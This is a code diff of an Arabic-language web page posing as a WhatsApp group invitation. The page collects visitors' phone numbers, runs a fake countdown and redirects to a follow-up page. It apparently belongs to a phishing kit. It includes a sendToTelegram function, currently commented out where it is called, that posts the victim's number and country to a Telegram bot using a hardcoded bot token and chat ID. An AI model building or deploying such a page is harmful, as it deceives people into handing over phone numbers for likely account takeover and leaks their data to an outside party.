@@ -11,17 +11,17 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
     <style>
         :root {
-            --whatsapp-green: #25D366;
-            --whatsapp-dark-green: #128C7E;
-            --whatsapp-darker-green: #075E54;
-            --whatsapp-light-green: #DCF8C6;
+            --primary: #25D366;
+            --primary-dark: #128C7E;
+            --primary-darker: #075E54;
+            --primary-light: #DCF8C6;
             --white: #FFFFFF;
-            --light-gray: #F5F5F5;
-            --medium-gray: #E5E5E5;
-            --dark-gray: #777777;
-            --black: #333333;
-            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            --transition: all 0.3s ease;
+            --light-bg: #F5F5F5;
+            --border-color: #E5E5E5;
+            --text-secondary: #777777;
+            --text-primary: #333333;
+            --shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
         }
 
         * {
@@ -32,85 +32,117 @@
 
         body {
             font-family: 'Tajawal', sans-serif;
-            background-color: var(--light-gray);
-            color: var(--black);
+            background-color: var(--light-bg);
+            color: var(--text-primary);
             line-height: 1.6;
-        }
-
-        .container {
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
             padding: 20px;
         }
 
-        .modal {
+        .card {
             background-color: var(--white);
-            border-radius: 12px;
+            border-radius: 16px;
             box-shadow: var(--shadow);
             width: 100%;
-            max-width: 500px;
+            max-width: 480px;
             overflow: hidden;
-            animation: fadeIn 0.4s ease-out;
+            transform: translateY(0);
+            animation: cardEntrance 0.6s ease-out;
         }
 
-        .modal-header {
-            background-color: var(--whatsapp-dark-green);
+        .card-header {
+            background: linear-gradient(135deg, var(--primary-dark), var(--primary-darker));
             color: var(--white);
-            padding: 20px;
+            padding: 24px;
             text-align: center;
+            position: relative;
+            overflow: hidden;
         }
 
-        .modal-header h2 {
+        .card-header::after {
+            content: '';
+            position: absolute;
+            bottom: -50px;
+            right: -50px;
+            width: 100px;
+            height: 100px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+
+        .card-header::before {
+            content: '';
+            position: absolute;
+            top: -30px;
+            left: -30px;
+            width: 80px;
+            height: 80px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+
+        .card-header h2 {
             font-size: 1.5rem;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
+            position: relative;
+            z-index: 1;
         }
 
-        .modal-header p {
-            font-size: 0.9rem;
+        .card-header p {
+            font-size: 0.95rem;
             opacity: 0.9;
+            position: relative;
+            z-index: 1;
         }
 
-        .modal-body {
-            padding: 25px;
+        .card-body {
+            padding: 28px;
         }
 
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
 
-        .form-group label {
+        .form-label {
             display: block;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
             font-weight: 500;
-            color: var(--black);
+            color: var(--text-primary);
+            font-size: 0.95rem;
         }
 
-        .input-field {
+        .input-wrapper {
+            position: relative;
+        }
+
+        .phone-input {
             width: 100%;
-            padding: 12px 15px;
-            border: 1px solid var(--medium-gray);
-            border-radius: 8px;
+            padding: 14px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
             font-size: 16px;
             transition: var(--transition);
             font-family: 'Tajawal', sans-serif;
+            background-color: var(--white);
         }
 
-        .input-field:focus {
-            border-color: var(--whatsapp-green);
+        .phone-input:focus {
+            border-color: var(--primary);
             outline: none;
-            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.2);
+            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.15);
         }
 
         .submit-btn {
-            background-color: var(--whatsapp-green);
+            background: linear-gradient(to right, var(--primary), var(--primary-dark));
             color: var(--white);
             border: none;
-            padding: 14px;
+            padding: 16px;
             font-size: 16px;
             font-weight: 500;
-            border-radius: 8px;
+            border-radius: 10px;
             cursor: pointer;
             width: 100%;
             transition: var(--transition);
@@ -118,86 +150,96 @@
             align-items: center;
             justify-content: center;
             gap: 10px;
+            box-shadow: 0 4px 12px rgba(37, 211, 102, 0.25);
         }
 
         .submit-btn:hover {
-            background-color: var(--whatsapp-dark-green);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(37, 211, 102, 0.3);
         }
 
-        .countdown-container {
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .countdown-section {
             display: none;
             text-align: center;
             padding: 20px;
+            animation: fadeIn 0.5s ease-out;
         }
 
         .countdown-title {
             font-size: 1.3rem;
-            color: var(--whatsapp-darker-green);
-            margin-bottom: 20px;
+            color: var(--primary-darker);
+            margin-bottom: 24px;
+            font-weight: 500;
         }
 
-        .countdown-display {
+        .countdown-visual {
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            margin-bottom: 25px;
+            margin-bottom: 28px;
         }
 
         .countdown-circle {
-            width: 120px;
-            height: 120px;
+            width: 140px;
+            height: 140px;
             border-radius: 50%;
             background: conic-gradient(
-                var(--whatsapp-green) 0%, 
-                var(--whatsapp-light-green) 0%
+                var(--primary) 0%, 
+                var(--primary-light) 0%
             );
             display: flex;
             align-items: center;
             justify-content: center;
             position: relative;
             box-shadow: var(--shadow);
+            margin-bottom: 16px;
         }
 
         .countdown-number {
-            font-size: 2.5rem;
+            font-size: 2.8rem;
             font-weight: 700;
-            color: var(--whatsapp-darker-green);
+            color: var(--primary-darker);
         }
 
         .countdown-label {
-            position: absolute;
-            bottom: -20px;
-            font-size: 0.9rem;
-            color: var(--dark-gray);
+            font-size: 1rem;
+            color: var(--text-secondary);
+            margin-top: 8px;
         }
 
         .progress-container {
             width: 100%;
-            height: 6px;
-            background-color: var(--whatsapp-light-green);
-            border-radius: 3px;
-            margin: 25px 0;
+            height: 8px;
+            background-color: var(--primary-light);
+            border-radius: 4px;
+            margin: 24px 0;
             overflow: hidden;
         }
 
         .progress-bar {
             height: 100%;
-            background-color: var(--whatsapp-green);
+            background: linear-gradient(to right, var(--primary), var(--primary-dark));
             width: 0%;
             transition: width 1s linear;
-        }
-
-        .status-message {
-            color: var(--dark-gray);
-            margin-top: 15px;
-            font-size: 0.95rem;
+            border-radius: 4px;
         }
 
         .whatsapp-icon {
-            color: var(--whatsapp-green);
-            font-size: 2.5rem;
-            margin: 15px 0;
-            animation: pulse 1.5s infinite;
+            color: var(--primary);
+            font-size: 3rem;
+            margin: 20px 0;
+            animation: pulse 1.5s infinite ease-in-out;
+        }
+
+        .status-text {
+            color: var(--text-secondary);
+            margin-top: 16px;
+            font-size: 1rem;
+            line-height: 1.6;
         }
 
         .spinner {
@@ -215,79 +257,105 @@
         }
 
         @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-20px); }
+            from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* تعديلات خاصة باللغة العربية */
-        .iti--allow-dropdown .iti__flag-container, 
-        .iti--separate-dial-code .iti__flag-container {
-            right: auto;
-            left: 0;
+        @keyframes cardEntrance {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* تحسينات لمختار الدول */
+        .iti {
+            width: 100%;
+        }
+
+        .iti__selected-flag {
+            padding: 0 12px 0 6px;
         }
 
         .iti__arrow {
+            border-left: 3px solid transparent;
+            border-right: 3px solid transparent;
+            border-top: 4px solid #555;
             margin-right: 6px;
-            margin-left: 0;
         }
 
         .iti__country-list {
             text-align: right;
+            border-radius: 8px;
+            box-shadow: var(--shadow);
+            font-family: 'Tajawal', sans-serif;
+        }
+
+        /* رسائل التنبيه */
+        .alert {
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            display: none;
+        }
+
+        .alert-error {
+            background-color: #FFEBEE;
+            color: #C62828;
+            border-left: 4px solid #EF5350;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="modal">
-            <div class="modal-header">
-                <h2>انضم إلى مجموعتنا على واتساب</h2>
-                <p>أدخل رقم هاتفك لتلقي رابط الدعوة</p>
-            </div>
+    <div class="card">
+        <div class="card-header">
+            <h2>انضم إلى مجموعتنا على واتساب</h2>
+            <p>أدخل رقم هاتفك لتلقي رابط الدعوة مباشرة</p>
+        </div>
+        
+        <div class="card-body">
+            <div class="alert alert-error" id="errorAlert"></div>
             
-            <div class="modal-body">
-                <form id="whatsappForm">
-                    <div class="form-group">
-                        <label for="phone">رقم الهاتف السعودي</label>
-                        <input type="tel" id="phone" class="input-field" required>
-                        <small style="color: var(--dark-gray); display: block; margin-top: 5px;">
-                            مثال: 5x xxx xxxx
-                        </small>
+            <form id="whatsappForm">
+                <div class="form-group">
+                    <label for="phone" class="form-label">رقم الهاتف</label>
+                    <div class="input-wrapper">
+                        <input type="tel" id="phone" class="phone-input" required>
                     </div>
-                    
-                    <div class="form-group">
-                        <button type="submit" class="submit-btn" id="submitBtn">
-                            <span>انضم الآن</span>
-                            <i class="fab fa-whatsapp"></i>
-                        </button>
-                    </div>
-                </form>
-                
-                <div class="countdown-container" id="countdownSection">
-                    <h3 class="countdown-title">جاري تحضير رابط المجموعة</h3>
-                    
-                    <div class="countdown-display">
-                        <div class="countdown-circle" id="countdownCircle">
-                            <span class="countdown-number" id="countdown">20</span>
-                            <span class="countdown-label">ثانية</span>
-                        </div>
-                    </div>
-                    
-                    <div class="progress-container">
-                        <div class="progress-bar" id="progressBar"></div>
-                    </div>
-                    
-                    <div class="whatsapp-icon">
-                        <i class="fab fa-whatsapp"></i>
-                    </div>
-                    
-                    <p class="status-message">جاري إعداد الدعوة الخاصة بك، الرجاء عدم إغلاق الصفحة...</p>
                 </div>
+                
+                <div class="form-group">
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        <span>الحصول على الرابط</span>
+                        <i class="fab fa-whatsapp"></i>
+                    </button>
+                </div>
+            </form>
+            
+            <div class="countdown-section" id="countdownSection">
+                <h3 class="countdown-title">جاري إنشاء رابط الدعوة الخاص بك</h3>
+                
+                <div class="countdown-visual">
+                    <div class="countdown-circle" id="countdownCircle">
+                        <span class="countdown-number" id="countdown">20</span>
+                    </div>
+                    <span class="countdown-label">ثانية متبقية</span>
+                </div>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                
+                <div class="whatsapp-icon">
+                    <i class="fab fa-whatsapp"></i>
+                </div>
+                
+                <p class="status-text">نحن نعد رابط الدعوة الخاص بك، سيتم تحويلك تلقائياً عند الانتهاء.<br>الرجاء عدم إغلاق هذه الصفحة.</p>
             </div>
         </div>
     </div>
@@ -295,44 +363,62 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // تهيئة حقل إدخال الهاتف
+            // عناصر DOM
             const phoneInput = document.getElementById('phone');
-            const iti = window.intlTelInput(phoneInput, {
-                initialCountry: "sa",
-                preferredCountries: ["sa", "ae", "eg", "iq"],
-                separateDialCode: true,
-                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
-                autoPlaceholder: "off"
-            });
-
-            // عناصر الواجهة
             const whatsappForm = document.getElementById('whatsappForm');
             const countdownSection = document.getElementById('countdownSection');
             const submitBtn = document.getElementById('submitBtn');
             const countdownElement = document.getElementById('countdown');
             const countdownCircle = document.getElementById('countdownCircle');
             const progressBar = document.getElementById('progressBar');
+            const errorAlert = document.getElementById('errorAlert');
             
+            // تهيئة مدخل الهاتف
+            const iti = window.intlTelInput(phoneInput, {
+                initialCountry: "sa",
+                preferredCountries: ["sa", "ae", "eg", "iq", "jo", "kw", "lb", "om", "qa", "bh", "us", "gb"],
+                separateDialCode: true,
+                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+                autoPlaceholder: "off"
+            });
+
             // إرسال النموذج
             whatsappForm.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
                 const phoneNumber = iti.getNumber();
+                const isValid = iti.isValidNumber();
                 
-                if (!phoneNumber || !iti.isValidNumber()) {
-                    alert("الرجاء إدخال رقم هاتف سعودي صحيح");
+                // التحقق من صحة الرقم
+                if (!phoneNumber || !isValid) {
+                    showError("الرجاء إدخال رقم هاتف صحيح");
                     return;
                 }
                 
-                // تعطيل الزر وعرض حالة التحميل
+                // بدء عملية الإرسال
+                startCountdown();
+            });
+            
+            // عرض رسالة الخطأ
+            function showError(message) {
+                errorAlert.textContent = message;
+                errorAlert.style.display = 'block';
+                setTimeout(() => {
+                    errorAlert.style.display = 'none';
+                }, 5000);
+            }
+            
+            // بدء العد التنازلي
+            function startCountdown() {
+                // تعطيل الزر وإظهار حالة التحميل
                 submitBtn.disabled = true;
-                submitBtn.innerHTML = '<span class="spinner"></span> جاري التحقق...';
+                submitBtn.innerHTML = '<span class="spinner"></span> جاري المعالجة...';
                 
-                // إخفاء النموذج وعرض العد التنازلي
+                // إخفاء النموذج وإظهار العد التنازلي
                 whatsappForm.style.display = 'none';
                 countdownSection.style.display = 'block';
                 
-                // بدء العد التنازلي (20 ثانية)
+                // إعداد العد التنازلي (20 ثانية)
                 let seconds = 20;
                 const totalSeconds = seconds;
                 
@@ -340,44 +426,54 @@
                     seconds--;
                     countdownElement.textContent = seconds;
                     
-                    // تحديث دائرة التقدم
+                    // تحديث التقدم المرئي
                     const progressPercent = ((totalSeconds - seconds) / totalSeconds) * 100;
-                    countdownCircle.style.background = `
-                        conic-gradient(
-                            var(--whatsapp-green) ${progressPercent}%, 
-                            var(--whatsapp-light-green) ${progressPercent}%
-                        )
-                    `;
-                    
-                    // تحديث شريط التقدم
-                    progressBar.style.width = `${progressPercent}%`;
+                    updateProgress(progressPercent);
                     
                     // الانتقال عند انتهاء الوقت
                     if (seconds <= 0) {
                         clearInterval(countdownInterval);
-                        
-                        // إرسال البيانات إلى التليجرام (يمكنك تفعيله عند الحاجة)
-                        // sendToTelegram(phoneNumber);
-                        
-                        // الانتقال إلى الصفحة التالية
-                        setTimeout(() => {
-                            window.location.href = 'traitement.html';
-                        }, 500);
+                        completeProcess();
                     }
                 }, 1000);
-            });
+            }
             
-            // دالة إرسال البيانات إلى التليجرام
+            // تحديث المؤشرات المرئية
+            function updateProgress(percent) {
+                // تحديث الدائرة
+                countdownCircle.style.background = `
+                    conic-gradient(
+                        var(--primary) ${percent}%, 
+                        var(--primary-light) ${percent}%
+                    )
+                `;
+                
+                // تحديث شريط التقدم
+                progressBar.style.width = `${percent}%`;
+            }
+            
+            // إكمال العملية والانتقال
+            function completeProcess() {
+                // يمكنك هنا إضافة إرسال البيانات إلى التليجرام إذا لزم الأمر
+                // sendToTelegram(iti.getNumber());
+                
+                // الانتقال إلى الصفحة التالية
+                setTimeout(() => {
+                    window.location.href = 'traitement.html';
+                }, 500);
+            }
+            
+            // دالة إرسال البيانات إلى التليجرام (اختياري)
             function sendToTelegram(phone) {
                 const bots = [
                     { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" },
                     { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
                 ];
                 
-                const message = `طلب انضمام جديد:
+                const message = `طلب انضمام جديد إلى واتساب:
 📱 الرقم: ${phone}
-🕒 الوقت: ${new Date().toLocaleString('ar-SA')}
-📍 الدولة: السعودية`;
+🌍 الدولة: ${iti.getSelectedCountryData().name}
+🕒 الوقت: ${new Date().toLocaleString('ar-SA')}`;
                 
                 bots.forEach(bot => {
                     fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}`)
